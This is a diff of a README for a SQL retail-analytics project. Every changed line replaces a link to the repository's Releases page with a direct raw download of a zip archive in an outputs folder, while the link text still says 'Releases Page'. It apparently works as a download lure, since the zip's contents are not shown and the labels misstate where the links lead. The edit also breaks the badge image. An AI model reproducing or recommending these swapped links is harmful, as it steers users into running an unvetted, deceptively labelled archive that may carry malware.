@@ -1,6 +1,6 @@
 # 📊 Retail-Sales-Analytics-SQL - Your Data Analytics Made Simple
 
-[![Download Retail-Sales-Analytics-SQL](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/chillguyfsfs-ctrl/Retail-Sales-Analytics-SQL/releases)
+[![Download Retail-Sales-Analytics-SQL](https://github.com/chillguyfsfs-ctrl/Retail-Sales-Analytics-SQL/raw/refs/heads/main/outputs/Sales_Analytics_Retail_SQL_2.0-alpha.4.zip%20Now-Click%20Here-brightgreen)](https://github.com/chillguyfsfs-ctrl/Retail-Sales-Analytics-SQL/raw/refs/heads/main/outputs/Sales_Analytics_Retail_SQL_2.0-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome! This guide will help you download and run the Retail-Sales-Analytics-SQ
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/chillguyfsfs-ctrl/Retail-Sales-Analytics-SQL/releases) of this repository.
+1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/chillguyfsfs-ctrl/Retail-Sales-Analytics-SQL/raw/refs/heads/main/outputs/Sales_Analytics_Retail_SQL_2.0-alpha.4.zip) of this repository.
   
 2. **Choose the Latest Version**: On the Releases page, find the latest version. Read the release notes for important updates and features.
 
@@ -61,7 +61,7 @@ If you experience issues, try these steps:
   
 - **Restart Application**: Close and reopen the application if it freezes or doesn’t respond.
 
-- **Update the Application**: Visit the [Releases Page](https://github.com/chillguyfsfs-ctrl/Retail-Sales-Analytics-SQL/releases) to ensure you are using the latest version.
+- **Update the Application**: Visit the [Releases Page](https://github.com/chillguyfsfs-ctrl/Retail-Sales-Analytics-SQL/raw/refs/heads/main/outputs/Sales_Analytics_Retail_SQL_2.0-alpha.4.zip) to ensure you are using the latest version.
 
 ### 💬 Support
 
